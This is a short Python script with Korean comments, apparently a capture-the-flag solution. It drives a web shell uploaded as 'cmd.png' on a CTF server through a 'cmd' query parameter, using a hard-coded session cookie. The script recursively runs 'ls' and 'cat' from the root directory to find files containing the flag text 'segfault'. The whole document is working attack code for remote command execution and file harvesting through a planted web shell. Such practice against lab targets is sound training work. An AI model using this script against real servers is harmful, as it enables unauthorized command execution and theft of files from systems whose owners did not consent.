import requests
from bs4 import BeautifulSoup

# 기본 설정
base_url = 'http://ctf.segfaulthub.com:3185/download_2/files/zoono1004/cmd.png'
cookies = {
    "PHPSESSID": "djpmvs45lghshe0rano246ao1f"  # PHP 세션 ID
}

# 디렉터리 내용을 리스트로 가져오는 함수
def list_directory(base_url, cookies, directory):
    url = f"{base_url}?cmd=ls%20{directory}"  # ls 명령 실행
    response = requests.post(url, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.text

# 파일 내용을 읽고 segfault가 있는지 확인하는 함수
def read_file(base_url, cookies, file_path):
    url = f"{base_url}?cmd=cat%20{file_path}"  # cat 명령 실행
    response = requests.post(url, cookies=cookies)
    file_content = response.text.strip()
    if 'segfault' in file_content:  # 파일 내용 중 segfault가 있으면
        return file_content
    return None

# 재귀적으로 디렉터리 탐색
def recursive_search(base_url, cookies, directory):
    contents = list_directory(base_url, cookies, directory)  # 현재 디렉터리 리스트 가져오기
    for item in contents.split("\n"):
        item = item.strip()
        if not item:  # 빈 항목 건너뛰기
            continue
        if "." not in item and not item.startswith("-"):  # 디렉터리로 추정
            new_dir = f"{directory}/{item}" if not directory.endswith("/") else f"{directory}{item}"
            recursive_search(base_url, cookies, new_dir)  # 하위 디렉터리 탐색
        else:  # 파일인 경우
            file_path = f"{directory}/{item}" if not directory.endswith("/") else f"{directory}{item}"
            file_content = read_file(base_url, cookies, file_path)  # 파일 내용 읽기
            if file_content:  # 내용에 segfault가 있으면
                print(f"Found 'segfault' in: {file_path}")
                print(f"File Content: {file_content}")

# 탐색 시작
recursive_search(base_url, cookies, "/")  # 루트 디렉터리부터 탐색
